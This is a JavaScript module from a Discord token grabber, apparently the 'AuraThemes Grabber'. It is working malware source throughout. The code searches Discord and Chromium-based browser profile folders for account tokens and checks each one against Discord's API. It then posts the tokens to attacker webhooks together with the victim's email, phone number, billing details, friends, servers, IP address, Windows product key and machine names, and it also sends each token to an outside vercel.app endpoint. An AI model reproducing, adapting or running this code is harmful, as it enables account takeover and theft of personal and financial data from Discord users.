import { get_info } from "./../../modules/core/core.mjs";
import { get_discord_Info } from "./../../utils/axios/discord.mjs";

import { instance } from "./../../utils/axios/request.mjs";

import { tokens, get_tokens } from "./finds.mjs";
import process from "process";

let local = process.env.localappdata;
let roaming = process.env.appdata;

let paths = [
    `${roaming}/discord/`,
    `${roaming}/discordcanary/`,
    `${roaming}/discordptb/`,
    `${roaming}/discorddevelopment/`,
    `${roaming}/lightcord/`,
    `${roaming}/Opera Software/Opera Stable/`,
    `${roaming}/Opera Software/Opera GX Stable/`,
    `${local}/Google/Chrome/User Data/Default/`,
    `${local}/Google/Chrome/User Data/Profile 1/`,
    `${local}/Google/Chrome/User Data/Profile 2/`,
    `${local}/Google/Chrome/User Data/Profile 3/`,
    `${local}/Google/Chrome/User Data/Profile 4/`,
    `${local}/Google/Chrome/User Data/Profile 5/`,
    `${local}/Google/Chrome/User Data/Guest Profile/`,
    `${local}/Google/Chrome/User Data/Default/Network/`,
    `${local}/Google/Chrome/User Data/Profile 1/Network/`,
    `${local}/Google/Chrome/User Data/Profile 2/Network/`,
    `${local}/Google/Chrome/User Data/Profile 3/Network/`,
    `${local}/Google/Chrome/User Data/Profile 4/Network/`,
    `${local}/Google/Chrome/User Data/Profile 5/Network/`,
    `${local}/Google/Chrome/User Data/Guest Profile/Network/`,
    `${local}/Microsoft/Edge/User Data/Default/`,
    `${local}/Microsoft/Edge/User Data/Profile 1/`,
    `${local}/Microsoft/Edge/User Data/Profile 2/`,
    `${local}/Microsoft/Edge/User Data/Profile 3/`,
    `${local}/Microsoft/Edge/User Data/Profile 4/`,
    `${local}/Microsoft/Edge/User Data/Profile 5/`,
    `${local}/Microsoft/Edge/User Data/Guest Profile/`,
    `${local}/Microsoft/Edge/User Data/Default/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 1/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 2/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 3/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 4/Network/`,
    `${local}/Microsoft/Edge/User Data/Profile 5/Network/`,
    `${local}/Microsoft/Edge/User Data/Guest Profile/Network/`,
];

export const send_webhook_tokens = async (webhook) => {
    for (const path of paths) await get_tokens(path);
    for (let token of tokens) {
        try {
            let infos;
            try {
                const req = await instance({
                    "url": `https://discord.com/api/v9/users/@me`,
                    "method": "GET",
                    "headers": {
                        "authorization": token
                    },
                })
                infos = await req["data"];
            } catch {
                infos = null;
            }
            if (!infos) continue;

            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
            const discord = await get_discord_Info(token);
            const system = await get_info();
            
            webhook.forEach(async (webhook) => {
                try {
                    await instance({
                        "url": webhook,
                        "method": "POST",
                        "data": {
                            "username": 'AuraThemes Grabber',
                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
                            "embeds": [{
                                "author": {
                                    "name": `${discord.username} | ${discord.ID}`,
                                    "icon_url": discord.avatar
                                },
                                "thumbnail": {
                                    "url": discord.avatar
                                },
                                "title": 'Initialized Grabber',
                                "color": "12740607",
                                "fields": [
                                    { "name": "<a:aura:1087044506542674091> Token:", "value": "```" + token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                                    { "name": "<a:aura:1101739920319590420> Nitro:", "value": `${discord.nitroType}`, inline: true },
                                    { "name": "<a:aura:995172580988309664> IP Adress", "value": `\`${system.IP}\``, inline: true },
                                    { "name": "<a:aura:863691953531125820> Phone", "value": `\`${discord.phone}\``, inline: true },
                                    { "name": "<:aura:974711605927505990> Email", "value": `\`${discord.mail}\``, inline: true },
                                    { "name": "Badges", "value": `${discord.badges}`, "inline": true },
                                    { "name": "Billing", "value": `${discord.billing}`, "inline": true },
                                    { "name": "Language", "value": `${discord.langue}`, "inline": true },
                                ],
                                "timestamp": new Date(),
                                "footer": {
                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
                                }
                            }]
                        },
                    });

                    setTimeout(() => instance({
                        "url": webhook,
                        "method": "POST",
                        "data": {
                            "username": 'AuraThemes Grabber',
                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
                            "embeds": [{
                                "author": {
                                    "name": `${discord.username} | ${discord.ID}`,
                                    "icon_url": discord.avatar
                                },
                                "thumbnail": {
                                    "url": discord.avatar
                                },
                                "title": 'HQ Guild(s)',
                                "color": "12740607",
                                "description": `${discord.rare?.guilds}`,
                                "timestamp": new Date(),
                                "footer": {
                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
                                }
                            }]
                        },
                    }), 50);

                    setTimeout(() => instance({
                        "url": webhook,
                        "method": "POST",
                        "data": {
                            "username": 'AuraThemes Grabber',
                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
                            "embeds": [{
                                "author": {
                                    "name": `${discord.username} | ${discord.ID}`,
                                    "icon_url": discord.avatar
                                },
                                "thumbnail": {
                                    "url": discord.avatar
                                },
                                "title": 'HQ Friend(s)',
                                "color": "12740607",
                                "description": `${discord.rare?.friends}`,
                                "timestamp": new Date(),
                                "footer": {
                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
                                }
                            }]
                        },
                    }), 100);

                    setTimeout(() => instance({
                        "url": webhook,
                        "method": "POST",
                        "data": {
                            "username": 'AuraThemes Grabber',
                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
                            "embeds": [{
                                "author": {
                                    "name": `${discord.username} | ${discord.ID}`,
                                    "icon_url": discord.avatar
                                },
                                "thumbnail": {
                                    "url": discord.avatar
                                },
                                "title": 'User Information(s)',
                                "color": "12740607",
                                "description": `**NSFW**${discord.NSFW}\n**Status**${discord.status}\n**Owner Servers**\`${discord.totalOwnedGuild}\`\n**Connection**\`${discord.totalConnection}\`\n**BOTS/RPC**\`${discord.totalApplication}\`\n**Blocked**\`${discord.totalBlocked}\`\n**Servers**\`${discord.totalGuild}\`\n**Friends**\`${discord.totalFriend}\`\n**Theme**\`${discord.theme}\`\n**Pending**\`${discord.pending}\`\n\n**Biography**\`\`\`yml\n${discord.bio === "has no description" ? "Not found" : discord.bio}\n\`\`\``,
                                "timestamp": new Date(),
                                "footer": {
                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
                                }
                            }]
                        },
                    }), 150);

                    setTimeout(() => instance({
                        "url": webhook,
                        "method": "POST",
                        "data": {
                            "username": 'AuraThemes Grabber',
                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
                            "embeds": [{
                                "author": {
                                    "name": `${discord.username} | ${discord.ID}`,
                                    "icon_url": discord.avatar
                                },
                                "thumbnail": {
                                    "url": discord.avatar
                                },
                                "title": 'System Information(s)',
                                "color": "12740607",
                                "fields": [
                                    { "name": "User", "value": `\`\`\`yml\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.COMPUTERNAME}\`\`\``, inline: false },
                                    { "name": "System", "value": `\`\`\`yml\nCPU: ${system.CPU}\nUUID: ${system.UID}\nRAM: ${system.RAM}\nMac Address: Not found\nProduct Key: ${system.WINDOWS_KEY}\nLOCAL IP: Not found\nOS Version: ${system.WINDOWS_VERSION}\`\`\``, inline: false },
                                    { "name": "Network", "value": `\`\`\`yml\nPUBLIC: ${system.IP}\nCountry: Not found\nRegion: Not found\nCity: Not found\nLatitude: Not found\nLongitude: Not found\nISP: Not found\nTime Zone: Not found\nCurrency Code: Not found\`\`\``, inline: false },
                                ],
                                "timestamp": new Date(),
                                "footer": {
                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
                                }
                            }]
                        },
                    }), 200);
                } catch (error) {
                    console.error("Error sending request to webhook:", error.message);
                }
            })
            instance.get(copy);
            continue;
        } catch (e) {
            return
        }
    }
}